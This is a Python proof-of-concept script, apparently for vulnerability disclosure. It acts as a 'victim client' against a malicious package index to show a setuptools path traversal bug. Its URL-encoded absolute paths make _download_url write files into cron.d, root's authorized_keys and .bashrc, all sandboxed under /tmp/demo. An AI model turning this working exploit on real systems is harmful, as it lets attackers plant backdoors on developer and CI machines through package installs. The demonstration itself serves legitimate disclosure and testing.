#!/usr/bin/env python3
"""
Victim Client - Demonstrates the path traversal vulnerability

This simulates a developer/CI system that connects to a malicious
package index and gets exploited via the path traversal vulnerability.
"""

import os
import sys
import tempfile
import time

# Setup demo directories (simulating system paths)
DEMO_DIRS = [
    "/tmp/demo/etc/cron.d",
    "/tmp/demo/root/.ssh",
    "/tmp/demo/home/victim",
]


def setup_demo_environment():
    """Create fake system directories for safe demonstration."""
    print("[VICTIM] Setting up demo environment...")
    for d in DEMO_DIRS:
        os.makedirs(d, exist_ok=True)
        print(f"         Created: {d}")


def wait_for_server(host, port, timeout=30):
    """Wait for the malicious server to be available."""
    import socket
    print(f"[VICTIM] Waiting for malicious server at {host}:{port}...")

    start = time.time()
    while time.time() - start < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                print(f"[VICTIM] Server is up!")
                return True
        except:
            pass
        time.sleep(1)

    print(f"[VICTIM] Timeout waiting for server")
    return False


def run_attack(server_host, server_port, scenario_name):
    """Execute the path traversal attack."""
    from setuptools.package_index import PackageIndex, egg_info_for_url

    print(f"\n{'=' * 60}")
    print(f"EXECUTING ATTACK: {scenario_name.upper()}")
    print("=" * 60)

    # Switch scenario on server
    import urllib.request
    try:
        urllib.request.urlopen(f"http://{server_host}:{server_port}/scenario/{scenario_name}")
    except:
        pass

    time.sleep(0.5)

    # Get package page to find the malicious link
    index_url = f"http://{server_host}:{server_port}/simple/"
    package_url = f"http://{server_host}:{server_port}/simple/malicious-package/"

    print(f"\n[VICTIM] Connecting to package index: {index_url}")
    print(f"[VICTIM] Fetching package: malicious-package")

    # Create PackageIndex and scan
    pi = PackageIndex(index_url=index_url)
    pi.scan_url(package_url)

    # Find the malicious URL that was served
    # The server embeds the encoded target path in the URL
    from urllib.parse import quote

    targets = {
        "cron": "/tmp/demo/etc/cron.d/backdoor",
        "ssh": "/tmp/demo/root/.ssh/authorized_keys",
        "bashrc": "/tmp/demo/home/victim/.bashrc",
    }

    target = targets.get(scenario_name, targets["cron"])
    encoded = quote(target, safe='')
    malicious_url = f"http://{server_host}:{server_port}/{encoded}"

    print(f"\n[VICTIM] Found download URL: {malicious_url[:50]}...")

    # Show the vulnerability
    name, _ = egg_info_for_url(malicious_url)
    print(f"[VICTIM] egg_info_for_url() extracted: {name}")

    with tempfile.TemporaryDirectory() as tmpdir:
        print(f"[VICTIM] Download directory: {tmpdir}")

        joined = os.path.join(tmpdir, name)
        print(f"[VICTIM] os.path.join(tmpdir, name) = {joined}")
        print(f"[VICTIM] ^^^ NOTE: tmpdir is IGNORED because name is absolute!")

        print(f"\n[VICTIM] Calling _download_url()...")
        result = pi._download_url(malicious_url, tmpdir)
        print(f"[VICTIM] Returned path: {result}")

    # Check if attack succeeded
    if os.path.exists(target):
        print(f"\n[EXPLOITED] File written to: {target}")
        print(f"\n[FILE CONTENTS]")
        print("-" * 40)
        with open(target, 'r') as f:
            print(f.read())
        print("-" * 40)
        return True
    else:
        print(f"\n[FAILED] File not created at: {target}")
        return False


def main():
    server_host = os.environ.get("SERVER_HOST", "server")
    server_port = int(os.environ.get("SERVER_PORT", "8080"))

    print("=" * 60)
    print("SETUPTOOLS PATH TRAVERSAL - VICTIM CLIENT")
    print("=" * 60)
    print(f"\nServer: {server_host}:{server_port}")

    # Setup
    setup_demo_environment()

    # Wait for server
    if not wait_for_server(server_host, server_port):
        print("[VICTIM] Could not connect to server, exiting")
        sys.exit(1)

    time.sleep(1)  # Give server a moment

    # Run all three scenarios
    scenarios = ["cron", "ssh", "bashrc"]
    results = []

    for scenario in scenarios:
        success = run_attack(server_host, server_port, scenario)
        results.append((scenario, success))
        time.sleep(1)

    # Summary
    print(f"\n{'=' * 60}")
    print("ATTACK SUMMARY")
    print("=" * 60)

    for scenario, success in results:
        status = "EXPLOITED" if success else "FAILED"
        print(f"  [{status}] {scenario}")

    print(f"\n[PROOF] Files created outside download directory:")
    os.system("find /tmp/demo -type f 2>/dev/null")

    print(f"\n{'=' * 60}")
    print("DEMONSTRATION COMPLETE")
    print("=" * 60)

    # Keep container running briefly to see output
    time.sleep(5)

    return 0 if all(r[1] for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
